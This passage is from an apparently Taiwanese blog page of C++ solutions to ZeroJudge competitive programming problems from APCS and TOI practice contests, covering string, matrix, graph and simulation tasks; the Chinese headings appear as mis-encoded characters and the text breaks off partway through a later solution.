<h3 id="e051-æ–‡æ„å­—å½™"><a href="#e051-æ–‡æ„å­—å½™" class="headerlink" title="e051. æ–‡æ„å­—å½™"></a>e051. æ–‡æ„å­—å½™</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=e051">https://zerojudge.tw/ShowProblem?problemid=e051</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šå­—ä¸²æ“ä½œèˆ‡æ ¼å¼åŒ–</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string word;</span><br><span class="line">    cin &gt;&gt; word;</span><br><span class="line">    cout &lt;&lt; word[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt; word.<span class="built_in">size</span>() ; i++)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;_&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; word[word.<span class="built_in">size</span>()<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="ğŸŸ¡-é€²éšæ¼”ç®—æ³•"><a href="#ğŸŸ¡-é€²éšæ¼”ç®—æ³•" class="headerlink" title="ğŸŸ¡ é€²éšæ¼”ç®—æ³•"></a>ğŸŸ¡ é€²éšæ¼”ç®—æ³•</h2><h3 id="b266-çŸ©é™£ç¿»è½‰-â€“-2016-APCS-å¯¦ä½œé¡Œç¬¬äºŒé¡Œ"><a href="#b266-çŸ©é™£ç¿»è½‰-â€“-2016-APCS-å¯¦ä½œé¡Œç¬¬äºŒé¡Œ" class="headerlink" title="b266. çŸ©é™£ç¿»è½‰ â€“ 2016 APCS å¯¦ä½œé¡Œç¬¬äºŒé¡Œ"></a>b266. çŸ©é™£ç¿»è½‰ â€“ 2016 APCS å¯¦ä½œé¡Œç¬¬äºŒé¡Œ</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=b266">https://zerojudge.tw/ShowProblem?problemid=b266</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šçŸ©é™£æ“ä½œèˆ‡åº§æ¨™è½‰æ›</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">ft</span>(<span class="type">int</span> &amp;R,<span class="type">int</span> &amp;C,<span class="type">int</span> &amp;M,vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp;m)&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;res = m;</span><br><span class="line">    <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">st</span>(<span class="type">int</span> &amp;R,<span class="type">int</span> &amp;C,<span class="type">int</span> &amp;M,vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp;m)&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">res</span>(C, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(R));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; R; ++i)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; C; ++j)</span><br><span class="line">            res[C - <span class="number">1</span> - j][i] = m[i][j]; <span class="comment">// é€†æ™‚é‡æ—‹è½‰å…¬å¼</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">swap</span>(R, C);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> R,C,M;</span><br><span class="line">    cin &gt;&gt; R &gt;&gt; C &gt;&gt; M;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;<span class="built_in">m</span>(R,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(C));</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;<span class="built_in">d</span>(M);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;R;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;C;j++)&#123;</span><br><span class="line">            cin &gt;&gt; m[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;M;i++)&#123;</span><br><span class="line">        cin &gt;&gt; d[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">reverse</span>(d.<span class="built_in">begin</span>(), d.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;M;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (d[i] == <span class="number">1</span>)&#123;</span><br><span class="line">            m=<span class="built_in">ft</span>(R, C, M, m);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            m=<span class="built_in">st</span>(R, C, M, m);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    cout &lt;&lt; R &lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt; C &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;R;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;C;j++)&#123;</span><br><span class="line">            cout &lt;&lt; m[i][j];</span><br><span class="line">            <span class="keyword">if</span>(j!=C<span class="number">-1</span>)&#123;</span><br><span class="line">                cout &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="c291-APCS-2017-0304-2å°ç¾¤é«”-â€“-2017å¹´-3æœˆ-APCS"><a href="#c291-APCS-2017-0304-2å°ç¾¤é«”-â€“-2017å¹´-3æœˆ-APCS" class="headerlink" title="c291. APCS 2017-0304-2å°ç¾¤é«” â€“ 2017å¹´ 3æœˆ APCS"></a>c291. APCS 2017-0304-2å°ç¾¤é«” â€“ 2017å¹´ 3æœˆ APCS</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=c291">https://zerojudge.tw/ShowProblem?problemid=c291</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šåœ–è«–ä¸­çš„é€£é€šçµ„ä»¶è¨ˆç®—</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">frd</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">ed</span><span class="params">(n,<span class="number">0</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin &gt;&gt; frd[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> group = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!ed[i])&#123;</span><br><span class="line">            <span class="type">int</span> tmp = i;</span><br><span class="line">            <span class="keyword">while</span>(!ed[tmp])&#123;</span><br><span class="line">                ed[tmp]=<span class="number">1</span>;</span><br><span class="line">                tmp=frd[tmp];</span><br><span class="line">            &#125;</span><br><span class="line">            group++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; group &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="c315-I-ROBOT-å‰å‚³"><a href="#c315-I-ROBOT-å‰å‚³" class="headerlink" title="c315. I, ROBOT å‰å‚³"></a>c315. I, ROBOT å‰å‚³</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=c315">https://zerojudge.tw/ShowProblem?problemid=c315</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šåº§æ¨™ç§»å‹•æ¨¡æ“¬</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,a,b;</span><br><span class="line">    <span class="type">int</span> x=<span class="number">0</span>,y=<span class="number">0</span>;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">        <span class="keyword">if</span>(a==<span class="number">0</span>)&#123;       <span class="comment">// åŒ—</span></span><br><span class="line">            y+=b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a==<span class="number">1</span>)&#123;       <span class="comment">// æ±</span></span><br><span class="line">            x+=b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a==<span class="number">2</span>)&#123;       <span class="comment">// å—</span></span><br><span class="line">            y-=b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a==<span class="number">3</span>)&#123;       <span class="comment">// è¥¿</span></span><br><span class="line">            x-=b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; x &lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt; y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="ğŸ”´-APCS-ç«¶è³½é¡Œ"><a href="#ğŸ”´-APCS-ç«¶è³½é¡Œ" class="headerlink" title="ğŸ”´ APCS ç«¶è³½é¡Œ"></a>ğŸ”´ APCS ç«¶è³½é¡Œ</h2><h3 id="o076-1-ç‰¹æŠ€è¡¨æ¼”-â€“-2024å¹´6æœˆ-APCS"><a href="#o076-1-ç‰¹æŠ€è¡¨æ¼”-â€“-2024å¹´6æœˆ-APCS" class="headerlink" title="o076. 1. ç‰¹æŠ€è¡¨æ¼” â€“ 2024å¹´6æœˆ APCS"></a>o076. 1. ç‰¹æŠ€è¡¨æ¼” â€“ 2024å¹´6æœˆ APCS</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=o076">https://zerojudge.tw/ShowProblem?problemid=o076</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šé€£çºŒéæ¸›åºåˆ—çš„æœ€å¤§é•·åº¦è¨ˆç®—</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,count=<span class="number">0</span>;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;<span class="built_in">nums</span>(n);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;counts;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin &gt;&gt; nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i<span class="number">-1</span>]&gt;nums[i])&#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            counts.<span class="built_in">push_back</span>(count);</span><br><span class="line">            count =<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        counts.<span class="built_in">push_back</span>(count);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; *<span class="built_in">max_element</span>(counts.<span class="built_in">begin</span>(),counts.<span class="built_in">end</span>())<span class="number">+1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="q182-2-å­—ä¸²æ“ä½œ-â€“-2025å¹´1æœˆ-APCS"><a href="#q182-2-å­—ä¸²æ“ä½œ-â€“-2025å¹´1æœˆ-APCS" class="headerlink" title="q182. 2. å­—ä¸²æ“ä½œ â€“ 2025å¹´1æœˆ APCS"></a>q182. 2. å­—ä¸²æ“ä½œ â€“ 2025å¹´1æœˆ APCS</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=q182">https://zerojudge.tw/ShowProblem?problemid=q182</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šå­—ä¸²è®Šæ›æ“ä½œçš„å¯¦ç¾</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">string str;</span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">s</span><span class="params">(string &amp;str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; str.<span class="built_in">size</span>() - <span class="number">1</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] &gt; str[i + <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(str[i], str[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">p</span><span class="params">(string &amp;str, string &amp;tamp)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> h = str.<span class="built_in">size</span>() / <span class="number">2</span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">char</span>&gt; <span class="title">a</span><span class="params">(h)</span>, <span class="title">b</span><span class="params">(h)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; h; i++) &#123;</span><br><span class="line">        a[i] = str[i];</span><br><span class="line">        b[i] = str[h + i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tamp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; h; i++) &#123;</span><br><span class="line">        tamp += a[i];</span><br><span class="line">        tamp += b[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; str &gt;&gt; k;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">kind</span><span class="params">(k)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        cin &gt;&gt; kind[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (kind[i] == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; str.<span class="built_in">size</span>() - <span class="number">1</span>; j += <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(str[j], str[j + <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (kind[i] == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">s</span>(str);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            string tamp;</span><br><span class="line">            <span class="built_in">p</span>(str, tamp);</span><br><span class="line">            str = tamp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="q836-1-å°å¿ƒé™·é˜±-â€“-2025å¹´6æœˆ-APCS"><a href="#q836-1-å°å¿ƒé™·é˜±-â€“-2025å¹´6æœˆ-APCS" class="headerlink" title="q836. 1. å°å¿ƒé™·é˜± â€“ 2025å¹´6æœˆ APCS"></a>q836. 1. å°å¿ƒé™·é˜± â€“ 2025å¹´6æœˆ APCS</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=q836">https://zerojudge.tw/ShowProblem?problemid=q836</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šéŠæˆ²æ¨¡æ“¬èˆ‡æ¢ä»¶åˆ¤æ–·</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> k, x1, x2, y1, y2;</span><br><span class="line">    cin &gt;&gt; k &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> position = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> health = k;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (health &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        position += health;</span><br><span class="line">        <span class="type">int</span> damage = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (position % x1 == <span class="number">0</span>) &#123;</span><br><span class="line">            damage += y1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (position % x2 == <span class="number">0</span>) &#123;</span><br><span class="line">            damage += y2;</span><br><span class="line">        &#125;</span><br><span class="line">        health -= damage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; position &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="q837-2-è½‰ç›¤å¾—åˆ†-â€“-2025å¹´6æœˆ-APCS"><a href="#q837-2-è½‰ç›¤å¾—åˆ†-â€“-2025å¹´6æœˆ-APCS" class="headerlink" title="q837. 2. è½‰ç›¤å¾—åˆ† â€“ 2025å¹´6æœˆ APCS"></a>q837. 2. è½‰ç›¤å¾—åˆ† â€“ 2025å¹´6æœˆ APCS</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=q837">https://zerojudge.tw/ShowProblem?problemid=q837</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šé™£åˆ—æ—‹è½‰èˆ‡çµ±è¨ˆè¨ˆç®—</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n,m,k;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">turn</span><span class="params">(<span class="type">int</span> b, vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; &amp;arr, <span class="type">int</span> row)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> len = arr[row].<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span> || len == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> times = <span class="built_in">abs</span>(b % len);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (b &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> z = <span class="number">0</span>; z &lt; times; z++) &#123;</span><br><span class="line">            <span class="type">char</span> tmp = arr[row].<span class="built_in">back</span>();</span><br><span class="line">            arr[row].<span class="built_in">pop_back</span>();</span><br><span class="line">            arr[row].<span class="built_in">insert</span>(arr[row].<span class="built_in">begin</span>(), tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> z = <span class="number">0</span>; z &lt; times; z++) &#123;</span><br><span class="line">            <span class="type">char</span> tmp = arr[row][<span class="number">0</span>];</span><br><span class="line">            arr[row].<span class="built_in">erase</span>(arr[row].<span class="built_in">begin</span>());</span><br><span class="line">            arr[row].<span class="built_in">push_back</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">score</span><span class="params">(<span class="type">const</span> vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> col = <span class="number">0</span>; col &lt; n; ++col) &#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; freq;</span><br><span class="line">        <span class="type">int</span> maxCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> row = <span class="number">0</span>; row &lt; m; ++row) &#123;</span><br><span class="line">            maxCount = <span class="built_in">max</span>(maxCount, ++freq[arr[row][col]]);</span><br><span class="line">        &#125;</span><br><span class="line">        total += maxCount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; m &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; <span class="built_in">arr</span>(m, <span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;(n));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            cin &gt;&gt; arr[i][j];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> totalScore = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; k; t++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> b;</span><br><span class="line">            cin &gt;&gt; b;</span><br><span class="line">            <span class="built_in">turn</span>(b, arr, i);</span><br><span class="line">        &#125;</span><br><span class="line">        totalScore += <span class="built_in">score</span>(arr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; totalScore &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="ğŸŸ -TOI-ç·´ç¿’è³½"><a href="#ğŸŸ -TOI-ç·´ç¿’è³½" class="headerlink" title="ğŸŸ  TOI ç·´ç¿’è³½"></a>ğŸŸ  TOI ç·´ç¿’è³½</h2><h3 id="m396-ç…²ä»”é£¯-ClayPotRice-â€“-TOI-ç·´ç¿’è³½-202310-æ–°æ‰‹çµ„-ç¬¬1é¡Œ"><a href="#m396-ç…²ä»”é£¯-ClayPotRice-â€“-TOI-ç·´ç¿’è³½-202310-æ–°æ‰‹çµ„-ç¬¬1é¡Œ" class="headerlink" title="m396. ç…²ä»”é£¯ (ClayPotRice) â€“ TOI ç·´ç¿’è³½ 202310 æ–°æ‰‹çµ„ ç¬¬1é¡Œ"></a>m396. ç…²ä»”é£¯ (ClayPotRice) â€“ TOI ç·´ç¿’è³½ 202310 æ–°æ‰‹çµ„ ç¬¬1é¡Œ</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=m396">https://zerojudge.tw/ShowProblem?problemid=m396</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šç°¡å–®çš„åŠ æ³•èˆ‡æ¢ä»¶åˆ¤æ–·</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t, g, w, e, b;</span><br><span class="line">    cin &gt;&gt; t &gt;&gt; g &gt;&gt; w &gt;&gt; e &gt;&gt; b;</span><br><span class="line">    <span class="type">int</span> a = g + w + e + b;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (a &lt;= t) &#123;</span><br><span class="line">        cout &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="number">-1</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="n630-é›»å½±é™¢-Cinema"><a href="#n630-é›»å½±é™¢-Cinema" class="headerlink" title="n630. é›»å½±é™¢ (Cinema)"></a>n630. é›»å½±é™¢ (Cinema)</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=n630">https://zerojudge.tw/ShowProblem?problemid=n630</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šæ™‚é–“è™•ç†èˆ‡çµæ§‹é«”æ‡‰ç”¨</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">movtime</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">tm</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> h * <span class="number">60</span> + m;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">2</span>) &lt;&lt; <span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; h &lt;&lt; <span 